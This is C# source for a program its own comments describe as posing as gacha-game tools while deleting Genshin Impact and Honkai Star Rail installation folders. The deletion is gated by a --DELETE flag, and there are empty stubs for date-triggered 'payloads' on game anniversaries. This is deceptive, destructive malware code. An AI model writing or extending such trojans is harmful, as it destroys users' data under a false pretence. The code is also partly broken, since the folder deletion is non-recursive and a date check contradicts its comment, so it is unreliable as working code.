// See https://aka.ms/new-console-template for more information

//This program claims to be a set of tools for Genshin Impact/other gacha games but instead deletes the game(s) in question
//For legal reasons, 'Payload' in the code comments does not mean anything malicious. 
namespace GachaDestroyer
{
    internal class Program
    {
        static void Main(String[] args)
        {

            bool actuallyDeleteFiles = false;

            //Default Directory Paths, change these as necessary
            string GenshinDir = @"C:\Program Files\Epic Games\GenshinImpact";
            string StarRailDir = @"C:\Program Files\Epic Games\HonkaiStarRail";

            //Check if the --DELETE argument is given before deleting the files; Idiot Proofing
            for (int i = 0; i < args.Length; i++)
            {
                //Console.WriteLine(args[i]);
                if (args[i] == "--DELETE")
                {
                    actuallyDeleteFiles = true;
                }
            }

            //Misc stuff, change cmd to green to make it look more like the matrix and get the date/time
            string dateTime = (DateTime.Now).ToString();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(dateTime);

            //Check the default install directory and remove the installation if it is found
            //TODO - Have a way of searching all directories and drives for the exe rather than checking defaults because checking only defaults is stupid and limits the effectiveness of the program
            //Instead, check defaults first before scanning the drive


            //Do the things
            Collide();
            Derail();

            //Collide, the function that deletes Genshin. Add additional payloads if the date is Sept. 28, the game's anniversary.
            void Collide()
            {
                if (Directory.Exists(GenshinDir))
                {
                    Console.WriteLine("Genshin Impact Detected");
                    if (actuallyDeleteFiles) { Directory.Delete(GenshinDir); }

                    //Trigger payloads if date is September 28, the release date
                    if (dateTime.Contains("8/28/"))
                    {
                        //Trigger some payloads
                    }
                    //File.Delete(@"C:\Program Files\Epic Games\GenshinImpact\Genshin Impact Game\GenshinImpact.exe");
                }
                else
                {
                    Console.WriteLine("Genshin not detected");
                }
            }

            //Derail, for deleting Star Rail. 
            void Derail()
            {
                if (Directory.Exists(StarRailDir))
                {
                    Console.WriteLine("Star Rail Detected");
                    if (actuallyDeleteFiles) { Directory.Delete(StarRailDir); }

                    //Trigger payloads if date is April 25, the release date, or March 7th, which is apparently the mascot for the game. Yes these idiots went and actually named a character after a random day of the gregorian calendar.
                    if (dateTime.Contains("4/25/") | dateTime.Contains("3/07/"))
                    {
                        //Trigger some payloads 
                    }
                }
                else
                {
                    Console.WriteLine("Honkai Star Rail not detected");
                }
            }
            //Stop the program from exiting
            Console.ReadLine();
        }
    }
}